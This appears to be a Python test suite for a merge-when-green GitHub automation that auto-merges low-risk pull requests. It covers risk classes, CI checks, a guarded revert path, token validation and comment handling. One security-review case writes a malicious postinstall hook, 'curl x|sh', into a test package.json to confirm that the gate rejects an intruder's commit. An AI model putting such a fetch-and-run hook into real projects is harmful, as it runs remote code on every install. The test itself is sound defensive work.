"""Cases for pr_merge.py: every precondition of the repo, every "never merges" of the PR, the lens
verdict, the revert path, the message, the comment upsert, the token checks of `merge`, and an API
call budget."""
import json
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import harness as H  # noqa: E402
from harness import job, run  # noqa: E402

S = H.Suite("pr-merge")
PM = "merge-when-green/pr-merge.sh"
R = H.REPO
EXIT = {"merge": 0, "wait": 10, "verdict": 20, "escalate": 30, "skip": 40}
APP_BOT = "%s[bot]" % H.APP


def world(**cfg):
    w = H.World()
    w.eligible(**cfg)
    return w


def add_pr(w, n, files=("docs/a.md",), others=(), **kw):
    p = w.green_pr(n, **kw)
    w.files(n, list(files))
    w.open_pulls([p] + list(others))
    return p


def decide(w, n, env=None):
    res = H.run_script(PM, ["decide", "--repo", R, "--pr", str(n), "--json"], w, env)
    try:
        d = json.loads(res["out"])
    except ValueError:
        d = {"decision": "?", "reasons": [res["err"].strip() or res["out"]]}
    return res, d


def expect(label, w, n, want, contains=None, env=None):
    res, d = decide(w, n, env)
    ok = res["rc"] == EXIT.get(want, -1) and d.get("decision") == want
    if ok and contains:
        ok = any(contains in r for r in d.get("reasons", []))
    S.check("%s -> %s" % (label, want), ok, "rc=%s decision=%s reasons=%s" % (res["rc"], d.get("decision"), d.get("reasons")))
    return res, d


# ── the happy path ───────────────────────────────────────────────────────────────────────────────
w = world()
add_pr(w, 5)
res, d = expect("riesgo-0 docs, CI green, develop green", w, 5, "merge")
S.check("decide is read-only", not H.writes(res), H.writes(res))
S.check("decide stays under 30 API calls", d.get("api_calls", 99) <= 30, d.get("api_calls"))

# ── what the PR itself must not be ───────────────────────────────────────────────────────────────
w = world(); add_pr(w, 5, base="main")
expect("targets the protected branch (promotion)", w, 5, "skip", "never automatic")
w = world(); add_pr(w, 5, base="release")
expect("targets another branch", w, 5, "skip", "not the integration branch")
w = world(); add_pr(w, 5, draft=True)
expect("draft", w, 5, "skip", "draft")
w = world(); add_pr(w, 5, fork=True)
expect("head in a fork", w, 5, "skip", "fork")
w = world(); add_pr(w, 5, head_ref="main")
expect("head is a long-lived branch", w, 5, "skip", "long-lived")
w = H.World(); w.policy(long_lived_branches=["release/2026"]); w.config(); w.workflows({"ci.yml": "", "develop-health.yml": ""})
w.develop(H.sha(900)); w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, [])
add_pr(w, 5, head_ref="release/2026")
expect("head listed in long_lived_branches", w, 5, "skip", "long-lived")
for lab in ("revision-humana", "sin-revision-independiente", "no-automerge", "merge-freeze"):
    w = world(); add_pr(w, 5, labels=("semver:patch", lab))
    expect("labelled %s" % lab, w, 5, "skip", "with a person")
w = world(); add_pr(w, 5, author=APP_BOT)
expect("opened by the App and not a revert", w, 5, "skip", "not a revert")
w = world(); add_pr(w, 5, author="renovate[bot]", body="🚦 **Automerge**: Enabled.")
expect("Renovate automerges it itself", w, 5, "skip", "Renovate automerges")

# ── class ─────────────────────────────────────────────────────────────────────────────────────────
w = world(); add_pr(w, 5, files=[".github/workflows/ci.yml"])
expect("riesgo-3 by a person, CI green: escalate", w, 5, "escalate", "riesgo:3")
w = world(); add_pr(w, 5, files=["migrations/1.sql"])
expect("riesgo-4: escalate", w, 5, "escalate", "riesgo:4")
w = world(); p = add_pr(w, 5, files=[".github/workflows/ci.yml"])
w.runs(p["head"]["sha"], [run(1, "ci.yml", "pull_request", p["head"]["ref"], p["head"]["sha"], [job("test", status="in_progress")])])
expect("riesgo-3 with CI pending: waits, escalates later", w, 5, "wait", "escalates once CI is green")
w = world(); p = add_pr(w, 5, files=[".github/workflows/ci.yml"])
w.runs(p["head"]["sha"], [run(1, "ci.yml", "pull_request", p["head"]["ref"], p["head"]["sha"], [job("test", "failure")])])
expect("riesgo-3 with CI red: the author fixes it first", w, 5, "skip", "CI red")
w = world(); add_pr(w, 5, files=["package.json"], author="renovate[bot]")
w.commits(5, [{"author": "renovate[bot]", "committer": "web-flow", "message": "fix(deps): x"}])
w.file("package.json", '{"dependencies": {"a": "1.0.0"}}', ref=H.sha(505))
w.file("package.json", '{"dependencies": {"a": "1.0.1"}}', ref=H.sha(5))
expect("riesgo-3 bot PR: skipped, never labelled for the owner", w, 5, "skip", "bot PR")
w = world(); add_pr(w, 5, files=["src/x.ts"])
expect("riesgo-1 above max_auto_class=0", w, 5, "skip", "above max_auto_class")
w = world(); add_pr(w, 5, labels=())
expect("no semver label", w, 5, "skip", "semver")
w = world(); add_pr(w, 5, labels=("semver:major",))
expect("semver:major by a person is riesgo-4", w, 5, "escalate", "riesgo:4")

# ── lens verdict (max_auto_class 1) ──────────────────────────────────────────────────────────────
def verdict_comment(head, cls=1, author="owner", edited=False, gate=0, total=23, axis=4):
    body = "%s\n```json\n%s\n```" % ("<!-- agent-verdict v1 -->", json.dumps(
        {"head_sha": head, "class": cls, "reviewer": "sonnet-high", "owner_gate_exit": gate,
         "pr_score": {"total": total, "axis_min": axis}, "at": "2026-10-01T11:00:00Z"}))
    return {"id": 77, "user": {"login": author}, "body": body, "created_at": "2026-10-01T11:00:00Z",
            "updated_at": "2026-10-01T11:30:00Z" if edited else "2026-10-01T11:00:00Z"}


w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"])
expect("riesgo-1 without a verdict", w, 5, "verdict", "needs a sonnet-high verdict")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(4))])
expect("riesgo-1 with a verdict for another SHA", w, 5, "verdict", "ask again")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5))])
expect("riesgo-1 with a valid verdict", w, 5, "merge")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), author="stranger")])
expect("verdict by an untrusted author is ignored", w, 5, "verdict")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), edited=True)])
expect("an edited verdict is ignored", w, 5, "verdict")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), cls=3)])
expect("a verdict that raises the class to 3 escalates", w, 5, "escalate")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), gate=1)])
expect("the owner-decision lens did not clear it", w, 5, "escalate")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), cls=0)])
expect("a verdict cannot lower the class", w, 5, "verdict", "below the computed")
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), total=20)])
expect("pr-score below the bar", w, 5, "verdict", "pr-score")

# ── PR shape ─────────────────────────────────────────────────────────────────────────────────────
w = world(); child = w.pull(6, base="feat/pr-5"); add_pr(w, 5, others=[child])
expect("a stacked PR on top of it", w, 5, "skip", "stacked")
w = world(); add_pr(w, 5, body="## Merge method\n\n- [ ] Squash\n- [x] Rebase\n")
expect("template ticks another method", w, 5, "skip", "Squash")
w = world(); add_pr(w, 5, body="no template")
expect("a person's PR with no Merge method section", w, 5, "skip", "Merge method")
w = world(); add_pr(w, 5, files=[".nvmrc"], author="renovate[bot]", body="Renovate body")
w.config(renovate_minor_class=0)
w.commits(5, [{"author": "renovate[bot]", "committer": "web-flow", "message": "chore(deps): node"}])
expect("a bot PR without the section is squash", w, 5, "merge")

# ── CI ───────────────────────────────────────────────────────────────────────────────────────────
def with_ci(jobs_, **kw):
    w = world(**kw)
    p = add_pr(w, 5)
    w.runs(p["head"]["sha"], [run(1, "ci.yml", "pull_request", p["head"]["ref"], p["head"]["sha"], jobs_)])
    return w


expect("CI red", with_ci([job("test", "failure")]), 5, "skip", "CI red")
expect("CI pending", with_ci([job("test", status="queued")]), 5, "wait", "CI pending")
expect("required check missing", with_ci([job("lint")]), 5, "wait", "CI missing")
w = with_ci([job("test", completed="2026-10-01T11:59:00Z")], settle_seconds=600)
expect("CI unsettled", w, 5, "wait", "CI unsettled")
w = world(); p = add_pr(w, 5)
w.branch_history(p["head"]["ref"], [run(60, "security.yml", "pull_request", p["head"]["ref"], H.sha(5),
                                        [job("gitleaks", "failure", attempt=1), job("gitleaks", attempt=2)], prs=[5])])
expect("an important check failed once: riesgo-3", w, 5, "escalate", "riesgo:3")
w = world(); p = add_pr(w, 5, mergeable=None)
expect("mergeability not computed yet", w, 5, "wait", "mergeability")
w = world(); p = add_pr(w, 5, mergeable=False)
expect("conflicts", w, 5, "skip", "conflicts")

# ── repo preconditions ───────────────────────────────────────────────────────────────────────────
w = H.World(); w.policy(); w.workflows({"ci.yml": "", "develop-health.yml": ""}); w.develop(H.sha(900))
w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, []); add_pr(w, 5)
expect("no config", w, 5, "skip", "no .github/merge-when-green.json")
w = world(); w.file(".github/merge-when-green.json", json.dumps({"version": 1, "max_auto_class": 3,
                                                                  "required_checks": [], "required_push_checks": []}))
add_pr(w, 5)
expect("invalid config (max_auto_class 3, no required checks)", w, 5, "skip", "config:")
w = world(); w.policy(agent_may_merge=False); add_pr(w, 5)
expect("agent_may_merge false", w, 5, "skip", "agent_may_merge")
w = world(); w.policy(integration_branch="main"); add_pr(w, 5, base="main")
expect("trunk repo", w, 5, "skip")
w = world(); w.workflows({"ci.yml": "jobs:\n  a:\n    continue-on-error: true\n", "develop-health.yml": ""}); add_pr(w, 5)
expect("continue-on-error in a workflow", w, 5, "skip", "continue-on-error")
w = world(); w.workflows({"ci.yml": "jobs:\n  a:\n    continue-on-error: false # never\n", "develop-health.yml": ""})
add_pr(w, 5)
expect("continue-on-error: false is fine", w, 5, "merge")
w = world(); w.workflows({"ci.yml": ""}); add_pr(w, 5)
expect("no develop-health workflow", w, 5, "skip", "develop-health")
w = world(); w.develop(H.sha(900), green=False); add_pr(w, 5)
expect("develop red", w, 5, "wait", "is red")
w = world(); w.r("GET", "repos/%s/commits/develop" % R, {"sha": H.sha(901)}); w.runs(H.sha(901), []); add_pr(w, 5)
expect("develop head without push runs yet", w, 5, "wait", "missing")
w = world(); w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, [{"number": 40, "user": {"login": "anyone"}}])
add_pr(w, 5)
expect("a merge-freeze issue is open", w, 5, "wait", "freeze")


# ── the revert path ──────────────────────────────────────────────────────────────────────────────
APP_REVERT_COMMIT = {"author": APP_BOT, "committer": "web-flow", "message": "revert: docs: x (#4)", "verified": True}


def revert_world(develop_green=False, freeze=True, files_same=True, trailer=0, merged_by=APP_BOT, author=APP_BOT,
                 commits=None, content_same=True, marker_sha=None, mergeable=True, develop="red", gate_line=True,
                 orig_files=None, rev_files=None, contents=None):
    w = world()
    if develop_green:
        develop = "green"
    if develop == "red":
        w.develop(H.sha(900), green=False)
    elif develop == "pending":
        w.runs(H.sha(900), [run(899, "ci.yml", "push", "develop", H.sha(900), [job("test", status="in_progress")])])
    if freeze:
        w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, [{"number": 40}])
    f, parent = H.sha(777), H.sha(776)
    body = "<!-- revert-of: #4 sha: %s -->\nReverts #4" % (marker_sha or f)
    p = add_pr(w, 9, author=author, labels=("revert-on-red", "riesgo:0", "semver:none"), body=body,
               title="revert: docs: x (#4)", files=rev_files or ("docs/a.md",), mergeable=mergeable)
    w.pull(4, state="closed", merged_at="2026-10-01T09:00:00Z", merge_commit_sha=f, merged_by=merged_by)
    w.files(4, orig_files or (["docs/a.md"] if files_same else ["docs/b.md"]))
    msg = "docs: x (#4)\n\nRisk-class: riesgo:%d\n%s" % (trailer, "Merge-gate: merge-when-green https://x/run/0\n"
                                                         if gate_line else "")
    w.r("GET", "repos/%s/commits/%s" % (R, f), {"sha": f, "parents": [{"sha": parent}], "commit": {"message": msg}})
    w.commits(9, commits or [APP_REVERT_COMMIT])
    for path, (before, after) in (contents or {"docs/a.md": ("before\n", "before\n" if content_same else "evil\n")}).items():
        w.file(path, before, ref=parent)
        w.file(path, after, ref=p["head"]["sha"])
    return w, p


w, _ = revert_world()
expect("a valid revert merges despite develop red and the freeze", w, 9, "merge", "reverts #4")
w, _ = revert_world(files_same=False)
expect("a revert with other files", w, 9, "skip", "exactly the files")
w, _ = revert_world(trailer=3)
expect("a revert of a riesgo-3 commit", w, 9, "skip", "riesgo:3")
w, _ = revert_world(merged_by="igonzalezespi")
expect("a revert of a person's merge", w, 9, "skip", "not merged by the App")
w, _ = revert_world(author="dev")
expect("revert-on-red on a PR the App did not open", w, 9, "skip", "opened by the merge App")
w, _ = revert_world(develop_green=True, freeze=False)
expect("develop green again (a fix went in first): the revert is not merged", w, 9, "skip", "green again")
w, _ = revert_world(develop_green=True)
expect("develop green again, freeze still open: not merged either", w, 9, "skip", "green again")
w, _ = revert_world(freeze=False)
expect("no merge-freeze issue open: nobody asked for this revert", w, 9, "skip", "merge-freeze")
w, _ = revert_world(develop="pending")
expect("develop pending: the revert waits for its verdict", w, 9, "wait", "is pending")
w, _ = revert_world(commits=[APP_REVERT_COMMIT, {"author": "dev", "committer": "dev", "message": "sneak", "verified": False}])
expect("a commit pushed on top of the App's revert", w, 9, "skip", "2 commits")
w, _ = revert_world(commits=[{"author": "dev", "committer": "dev", "message": "revert", "verified": True}])
expect("the revert's single commit is not the App's", w, 9, "skip", "not the App's signed commit")
w, _ = revert_world(commits=[dict(APP_REVERT_COMMIT, verified=False)])
expect("the App's name on an unsigned commit", w, 9, "skip", "unsigned")
w, _ = revert_world(content_same=False)
expect("same files, other content (same line counts)", w, 9, "skip", "is not what it was before #4")
w, _ = revert_world(marker_sha=H.sha(778))
expect("the revert-of marker names another commit", w, 9, "skip", "is not merged as")
w, _ = revert_world(gate_line=False)
expect("a Risk-class line without the gate's Merge-gate line is no trailer", w, 9, "skip", "no Risk-class trailer")
w, _ = revert_world(mergeable=False)
expect("a revert in conflict", w, 9, "skip", "conflicts")
w, _ = revert_world(orig_files=[{"filename": "docs/b.md", "previous_filename": "docs/a.md", "status": "renamed"}],
                    rev_files=[{"filename": "docs/a.md", "previous_filename": "docs/b.md", "status": "renamed"}],
                    contents={"docs/a.md": ("before\n", "before\n"), "docs/b.md": (None, None)})
expect("the revert of a rename (names compared old and new)", w, 9, "merge", "reverts #4")
# the security review's case: an intruder's commit with a postinstall on the revert branch
w, p9 = revert_world(rev_files=[{"filename": "package.json", "patch": '+ "scripts":{"postinstall":"curl x|sh"}'}],
                     orig_files=["package.json"], contents={"package.json": ("{}", '{"scripts":{"postinstall":"curl x|sh"}}')},
                     commits=[{"author": "intruso", "committer": "intruso", "verified": False}])
expect("an intruder's commit on the revert branch never rides the revert path", w, 9, "skip", "invalid revert")

# ── sweep ────────────────────────────────────────────────────────────────────────────────────────
def sweep(w, mode="dry", extra=(), env=None):
    plan = os.path.join(os.environ.get("TMPDIR", "/tmp"), "mwg-plan-%d.json" % os.getpid())
    res = H.run_script(PM, ["sweep", "--repo", R, "--mode", mode, "--plan", plan, "--run-url", "https://x/run/1"]
                       + list(extra), w, env)
    try:
        res["plan"] = json.load(open(plan))
    except (OSError, ValueError):
        res["plan"] = {}
    if os.path.exists(plan):
        os.unlink(plan)
    return res


w = world(); p5 = w.green_pr(5); w.files(5, ["docs/a.md"]); p6 = w.green_pr(6, created="2026-10-01T09:00:00Z")
w.files(6, ["docs/b.md"]); w.open_pulls([p6, p5])
res = sweep(w)
S.check("sweep: one merge per run, the oldest first", res["outputs"].get("merge_pr") == "6", res["outputs"])
S.check("sweep dry: never a PUT merge", not H.writes(res, "PUT"), H.writes(res, "PUT"))
S.check("sweep: riesgo:0 labelled", any(c["path"].endswith("/issues/5/labels") and c["input"] == {"labels": ["riesgo:0"]}
                                        for c in H.writes(res, "POST")))
S.check("sweep: one comment per evaluated PR", len([c for c in H.writes(res, "POST") if c["path"].endswith("/comments")]) == 2)
S.check("sweep: the plan carries the squash message",
        any(d.get("message", {}).get("title") == "feat: x (#6)" for d in res["plan"].get("decisions", [])))

# A PR stacked on another targets the parent's branch, so it is not among the candidates; the parent
# must still see it. In the sweep (what the workflow runs) the parent used to be named for the merge,
# the merge job re-decided "skip", and the next run named it again: the queue behind it never moved.
w = world(); p5 = w.green_pr(5, created="2026-10-01T08:00:00Z"); w.files(5, ["docs/a.md"])
p6 = w.green_pr(6, created="2026-10-01T09:00:00Z"); w.files(6, ["docs/b.md"])
kid = w.pull(7, base="feat/pr-5")
w.open_pulls([p5, p6, kid])
res = sweep(w)
dec = {d["pr"]: d for d in res["plan"].get("decisions", [])}
S.check("sweep: a PR with a ready PR stacked on it is skipped, and the next one goes",
        res["outputs"].get("merge_pr") == "6" and dec.get(5, {}).get("decision") == "skip" and
        any("stacked" in r for r in dec.get(5, {}).get("reasons", [])), (res["outputs"], dec.get(5)))
S.check("sweep: the stacked PR itself is not a candidate (it does not target develop)", 7 not in dec, sorted(dec))

w = world(); rp = w.green_pr(5); w.files(5, ["docs/a.md"])
wr, rev = revert_world()
wr.green_pr(5); wr.files(5, ["docs/a.md"]); wr.open_pulls([wr.routes["GET repos/%s/pulls/5" % R]["body"], rev])
res = sweep(wr)
S.check("sweep: a valid revert goes before older PRs", res["outputs"].get("merge_pr") == "9", res["outputs"])

w = world(); add_pr(w, 5, files=[".github/workflows/x.yml"])
res = sweep(w, "live")
S.check("sweep live: riesgo-3 listed for escalation", res["outputs"].get("escalate_prs") == "[5]", res["outputs"])
S.check("sweep: escalation is NOT done with GITHUB_TOKEN",
        not any("revision-humana" in json.dumps(c["input"]) for c in H.writes(res)))

w = world(); p = add_pr(w, 5)
prev = {"id": 91, "user": {"login": "github-actions[bot]"}, "created_at": H.T0, "updated_at": H.T0}
res = sweep(w)
first = [c for c in H.writes(res, "POST") if c["path"].endswith("/issues/5/comments")]
prev["body"] = first[0]["input"]["body"].replace("https://x/run/1", "https://x/run/0") if first else ""
w.comments(5, [prev])
res = sweep(w)
S.check("sweep: an unchanged decision does not edit the comment",
        not [c for c in H.writes(res) if "/comments" in c["path"]], H.writes(res))
w.comments(5, [dict(prev, body=prev["body"].replace("decision=merge", "decision=wait"))])
res = sweep(w)
S.check("sweep: a changed decision edits its own comment", any(c["method"] == "PATCH" and c["path"].endswith("/comments/91")
                                                               for c in H.writes(res)))
w.comments(5, [dict(prev, user={"login": "stranger"})])
res = sweep(w)
S.check("sweep: a forged marker by someone else is never edited",
        not any(c["method"] == "PATCH" for c in H.writes(res)) and
        any(c["method"] == "POST" and c["path"].endswith("/issues/5/comments") for c in H.writes(res)))

w = world(); add_pr(w, 5); w.remaining = 120
res = sweep(w)
S.check("sweep: low API quota waits without evaluating", "quota" in json.dumps(res["plan"].get("waits")) and
        not any("pulls/5/files" in c["path"] for c in res["calls"]), res["plan"])
w = world(); add_pr(w, 5)
res = sweep(w, extra=["--prs", "[]"])
S.check("sweep: a workflow_run with no PR evaluates nothing", res["rc"] == 0 and not any("/pulls" in c["path"] for c in res["calls"]))
w = world(); add_pr(w, 5); other = w.green_pr(6); w.files(6, ["docs/x.md"]); w.open_pulls([w.routes["GET repos/%s/pulls/5" % R]["body"], other])
res = sweep(w, extra=["--prs", "[6]"])
S.check("sweep: workflow_run evaluates only its PRs", not any("pulls/5/files" in c["path"] for c in res["calls"])
        and res["outputs"].get("merge_pr") == "6", res["outputs"])
w = world(); add_pr(w, 5)
res = sweep(w, extra=["--comment", "false", "--labels", "false"])
S.check("sweep selftest flags: no write at all", not H.writes(res), H.writes(res))
w = world(); add_pr(w, 5)
res = sweep(w)
S.check("sweep: under 40 API calls for one candidate (budget)", res["plan"].get("api_calls", 99) <= 40, res["plan"].get("api_calls"))
w = world(settle_seconds=600); p = add_pr(w, 5)
w.runs(p["head"]["sha"], [run(1, "ci.yml", "pull_request", p["head"]["ref"], p["head"]["sha"],
                              [job("test", completed="2026-10-01T11:59:00Z")])])
res = sweep(w, extra=["--max-settle-wait", "600"])
S.check("sweep: waits out the settle time inside the run, then merges", res["outputs"].get("merge_pr") == "5", res["plan"])

w = H.World(); w.policy(agent_may_merge=False); w.config(); w.workflows({"ci.yml": "", "develop-health.yml": ""})
add_pr(w, 5)
res = sweep(w)
S.check("sweep: a repo whose policy rules merging out is not evaluated (no PR read, nothing written)",
        not any("/pulls" in c["path"] for c in res["calls"]) and not H.writes(res), res["calls"][-3:])

# ── the message ──────────────────────────────────────────────────────────────────────────────────
w = world(); add_pr(w, 5, title="feat: thing [skip ci]")
w.commits(5, [{"author": "dev", "committer": "dev", "message": "feat: a\n\nfirst body\n\nskip-checks: true"},
              {"author": "dev", "committer": "dev", "message": "fix: b"}])
res = sweep(w)
msg = next((d.get("message") for d in res["plan"].get("decisions", []) if d.get("message")), {}) or {}
S.check("message: CI-skipping directives neutralized", "[skip ci]" not in json.dumps(msg) and
        "skip-checks: true" not in msg.get("body", ""), msg)
S.check("message: one bullet per commit with its body", "* feat: a" in msg.get("body", "") and "first body" in msg.get("body", ""), msg)
S.check("message: trailers", "Risk-class: riesgo:0" in msg.get("body", "") and "Merge-gate: merge-when-green https://x/run/1"
        in msg.get("body", ""), msg)

# ── merge (the only writer of a merge) ───────────────────────────────────────────────────────────
APP_ENV = {"GITHUB_ACTIONS": "true", "MWG_WRITE_TOKEN_KIND": "app", "MWG_WRITE_TOKEN": "ghs_apptoken", "MWG_READ_TOKEN": "ghs_readtoken",
           "MWG_APP_SLUG": H.APP}


def merge_world(**kw):
    w = world()
    add_pr(w, 5, **kw)
    w.r("GET", "installation/repositories", {"total_count": 1, "repositories": [{"full_name": R}]})
    w.r("PUT", "repos/%s/pulls/5/merge" % R, {"merged": True, "sha": H.sha(600)})
    w.r("GET", "repos/%s/branches/develop" % R, {"name": "develop"})
    w.r("GET", "repos/%s/branches/main" % R, {"name": "main"})
    return w


def merge(w, env=None, sha=None):
    return H.run_script(PM, ["merge", "--repo", R, "--pr", "5", "--sha", sha or H.sha(5), "--run-url", "https://x/run/2"],
                        w, dict(APP_ENV, **(env or {})))


w = merge_world()
res = merge(w)
puts = H.writes(res, "PUT")
S.check("merge: PUT once, squash, pinned to the evaluated SHA, with the App token",
        res["rc"] == 0 and len(puts) == 1 and puts[0]["input"]["sha"] == H.sha(5) and
        puts[0]["input"]["merge_method"] == "squash" and puts[0]["token"] == "ghs_ap", (res["err"], puts))
S.check("merge: title with (#N) and the trailers", puts and puts[0]["input"]["commit_title"] == "feat: x (#5)"
        and "Risk-class: riesgo:0" in puts[0]["input"]["commit_message"])
S.check("merge: reads use GITHUB_TOKEN", all(c["token"] == "ghs_re" for c in res["calls"] if c["method"] == "GET"
                                             and c["path"] != "installation/repositories"))
for label, env in (("outside GitHub Actions", {"GITHUB_ACTIONS": ""}),
                   ("not declared an App token", {"MWG_WRITE_TOKEN_KIND": "pat"}),
                   ("a personal token (gho_)", {"MWG_WRITE_TOKEN": "gho_personal"}),
                   ("the write token is GITHUB_TOKEN", {"MWG_WRITE_TOKEN": "ghs_readtoken"}),
                   ("a token of another App than the config trusts", {"MWG_APP_SLUG": "other-app"})):
    res = merge(merge_world(), env)
    S.check("merge refuses: %s" % label, res["rc"] == 2 and not H.writes(res, "PUT"), (res["rc"], res["err"]))
w = merge_world(); w.r("GET", "installation/repositories", {"total_count": 10, "repositories": [{"full_name": R}, {"full_name": "acme/other"}]})
res = merge(w)
S.check("merge refuses: the App token reaches more than this repo", res["rc"] == 2 and not H.writes(res, "PUT"), res["err"])
res = merge(merge_world(), sha=H.sha(4))
S.check("merge: the head moved since the plan -> wait, no PUT", res["rc"] == 10 and not H.writes(res, "PUT"))
w = merge_world(); w.r("PUT", "repos/%s/pulls/5/merge" % R, {"message": "Head branch was modified"}, status=409)
res = merge(w)
S.check("merge: 409 -> wait", res["rc"] == 10, res)
w = merge_world(labels=("semver:patch", "revision-humana"))
res = merge(w)
S.check("merge re-decides with fresh data (revision-humana added meanwhile)", res["rc"] == 40 and not H.writes(res, "PUT"))
w = merge_world(); p = w.routes["GET repos/%s/pulls/5" % R]["body"]
w.r("GET", "repos/%s/pulls/5" % R, dict(p, merged_at="2026-10-01T11:00:00Z"))
res = merge(w)
S.check("merge: already merged -> no-op", res["rc"] == 0 and not H.writes(res, "PUT"))
w = merge_world()
w.seq("GET", "repos/%s/pulls/5" % R, [{"body": w.routes["GET repos/%s/pulls/5" % R]["body"]}] * 2 +
      [{"body": dict(w.routes["GET repos/%s/pulls/5" % R]["body"], base={"ref": "main", "sha": "x", "repo": {"full_name": R}})}])
res = merge(w)
S.check("merge: base changed in the merge second -> revision-humana issue",
        res["rc"] == 1 and any(c["path"].endswith("/issues") and "revision-humana" in json.dumps(c["input"])
                               for c in H.writes(res, "POST")), (res["rc"], res["err"], H.writes(res, "POST")))
w = merge_world(mergeable=None)
w.seq("GET", "repos/%s/pulls/5" % R, [{"body": dict(w.routes["GET repos/%s/pulls/5" % R]["body"], mergeable=None)}] * 3 +
      [{"body": dict(w.routes["GET repos/%s/pulls/5" % R]["body"], mergeable=True)}])
res = merge(w)
S.check("merge: waits for mergeability (UNKNOWN after another merge)", res["rc"] == 0 and len(H.writes(res, "PUT")) == 1,
        (res["rc"], res["out"], res["err"]))

# ── escalate ─────────────────────────────────────────────────────────────────────────────────────
w = merge_world()
res = H.run_script(PM, ["escalate", "--repo", R, "--pr", "5"], w, APP_ENV)
lab = [c for c in H.writes(res, "POST") if c["path"].endswith("/issues/5/labels")]
S.check("escalate: revision-humana with the App token (so `labeled` wakes the TL;DR check)",
        res["rc"] == 0 and lab and lab[0]["token"] == "ghs_ap" and lab[0]["input"] == {"labels": ["revision-humana"]})
res = H.run_script(PM, ["escalate", "--repo", R, "--pr", "5"], merge_world())
S.check("escalate refuses without an App token", res["rc"] == 2)


# ── the repo read from a local sparse checkout (what the reusable workflow does) ────────────────
import atexit  # noqa: E402
import shutil  # noqa: E402
import tempfile  # noqa: E402
d = tempfile.mkdtemp()
SUMMARY_DIR = d
atexit.register(shutil.rmtree, d, True)
os.makedirs(os.path.join(d, ".github", "workflows"))
os.makedirs(os.path.join(d, "scripts", "hooks"))
json.dump({"agent_may_merge": True, "protected_branch": "main", "integration_branch": "develop"},
          open(os.path.join(d, "scripts", "hooks", "guard.policy.json"), "w"))
json.dump({"version": 1, "required_checks": [{"workflow": "ci.yml", "job": "test"}],
           "required_push_checks": [{"workflow": "ci.yml", "job": "test"}], "app_slug": H.APP},
          open(os.path.join(d, ".github", "merge-when-green.json"), "w"))
for n in ("ci.yml", "develop-health.yml"):
    open(os.path.join(d, ".github", "workflows", n), "w").write("name: x\n")
w = H.World()  # no contents routes: everything must come from the directory
w.develop(H.sha(900)); w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, [])
add_pr(w, 5)
res = H.run_script(PM, ["decide", "--repo", R, "--pr", "5", "--json", "--repo-dir", d], w)
S.check("--repo-dir: policy, config and workflows read from the checkout, no contents API",
        res["rc"] == 0 and not any("/contents/" in c["path"] for c in res["calls"]), (res["rc"], res["err"], res["out"][:300]))
open(os.path.join(d, ".github", "workflows", "q.yml"), "w").write("jobs:\n  a:\n    continue-on-error: ${{ true }}\n")
res = H.run_script(PM, ["decide", "--repo", R, "--pr", "5", "--json", "--repo-dir", d], w)
S.check("--repo-dir: continue-on-error found in the checkout", res["rc"] == 40 and "continue-on-error" in res["out"], res["out"][:300])

# ── more edges ───────────────────────────────────────────────────────────────────────────────────
w = world(max_auto_class=1); add_pr(w, 5, files=["src/x.ts"]); w.comments(5, [verdict_comment(H.sha(5), cls=2)])
expect("the lens raises riesgo-1 to 2, above max_auto_class=1", w, 5, "skip", "lens raised it")
w = H.World(); w.policy(important_checks="(unclosed"); w.config(); w.workflows({"ci.yml": "", "develop-health.yml": ""})
w.develop(H.sha(900)); w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, []); add_pr(w, 5)
expect("an important_checks pattern that does not compile blocks the repo", w, 5, "skip", "does not compile")
w = H.World(); w.policy(important_checks="lint-secret"); w.config(); w.workflows({"ci.yml": "", "develop-health.yml": ""})
w.develop(H.sha(900)); w.r("GET", "repos/%s/issues?state=open&labels=merge-freeze&per_page=100" % R, [])
p = add_pr(w, 5)
w.branch_history(p["head"]["ref"], [run(61, "q.yml", "pull_request", p["head"]["ref"], H.sha(5), [job("lint-secret", "failure", attempt=1),
                                                                                               job("lint-secret", attempt=2)], prs=[5])])
expect("the repo's own important_checks pattern is used", w, 5, "escalate", "important check")
w, _ = revert_world()
p9 = w.routes["GET repos/%s/pulls/9" % R]["body"]
w.runs(p9["head"]["sha"], [run(1, "ci.yml", "pull_request", p9["head"]["ref"], p9["head"]["sha"], [job("test", "failure")])])
expect("a revert whose CI is red waits for develop-health to escalate", w, 9, "skip", "revert's CI is red")
w, _ = revert_world()
w.runs(p9["head"]["sha"], [run(1, "ci.yml", "pull_request", p9["head"]["ref"], p9["head"]["sha"], [job("test", status="queued")])])
expect("a revert with CI pending waits", w, 9, "wait")
for cfg_bad, why in (({"version": 2}, "version"), ({"unknown": 1}, "unknown key"), ({"risk_paths": [{"glob": "x", "class": 7}]}, "risk_paths"),
                     ({"max_auto_class": 1, "verdict_authors": []}, "verdict_authors"), ({"settle_seconds": 5000}, "settle_seconds"),
                     ({"required_checks": [{"workflow": "ci.yml"}]}, "entries")):
    w = world(); base = {"version": 1, "required_checks": [{"workflow": "ci.yml", "job": "test"}],
                         "required_push_checks": [{"workflow": "ci.yml", "job": "test"}]}
    base.update(cfg_bad)
    w.file(".github/merge-when-green.json", json.dumps(base)); add_pr(w, 5)
    expect("invalid config: %s" % why, w, 5, "skip", why)
